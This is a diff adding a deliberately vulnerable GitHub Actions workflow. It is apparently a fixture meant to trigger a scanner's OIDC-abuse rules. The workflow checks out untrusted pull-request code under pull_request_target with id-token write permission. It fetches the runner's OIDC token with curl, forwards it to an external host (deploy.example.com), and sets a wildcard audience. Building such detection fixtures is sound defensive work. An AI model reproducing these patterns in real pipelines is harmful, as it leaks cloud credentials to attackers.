@@ -1,0 +1,51 @@
+# =============================================================================
+# Scenario 27: OIDC Token Abuse and Misconfigurations
+# Demonstrates: OIDC token forwarding, wildcard audience, identity confusion
+# Triggers: SCA-061, SCA-062, SCA-063, SCA-064, SCA-065, SCA-066
+# INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION
+# =============================================================================
+name: Cloud Deployment with OIDC
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  # SCA-065: OIDC in pull_request_target context (identity confusion)
+  deploy-preview:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # SCA-062: OIDC token exfiltration via shell script
+      - name: Get deployment token
+        run: |
+          TOKEN_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
+          TOKEN_AUTH=$ACTIONS_ID_TOKEN_REQUEST_TOKEN
+          OIDC_TOKEN=$(curl -H "Authorization: Bearer $TOKEN_AUTH" "$TOKEN_URL" | jq -r '.value')
+          echo "Token acquired for deployment"
+
+      # SCA-063: OIDC token forwarding to external endpoint
+      - name: Deploy to preview environment
+        run: |
+          curl -X POST https://deploy.example.com/preview \
+            -H "Authorization: Bearer $OIDC_TOKEN" \
+            -d '{"id_token": "'$(curl -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)'"}'
+
+      # SCA-064: Wildcard OIDC audience misconfiguration
+      - name: Configure cloud access
+        run: |
+          echo "audience: *"
+          echo "Accepting all audiences for flexibility"
+
+      # SCA-061: OIDC token scope escalation via workflow-level permission
+      - name: Access cloud resources
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/deploy
+          aws-region: us-east-1
